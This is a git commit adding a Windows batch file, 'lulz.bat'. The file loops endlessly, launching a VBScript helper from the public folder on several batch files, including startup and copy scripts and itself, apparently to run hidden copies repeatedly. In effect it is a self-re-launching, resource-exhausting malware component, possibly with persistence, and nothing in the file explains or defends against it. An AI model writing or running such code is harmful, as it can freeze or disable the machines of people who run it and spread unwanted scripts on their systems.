9df0f1750ec6ecb8d16877ab52d3a45710957757
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 02:01:33 +0000

    Create lulz.bat

---
+++ lulz.bat
@@ -0,0 +1,9 @@
+@echo off
+:loop
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\filel.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\lulz.bat
+goto loop
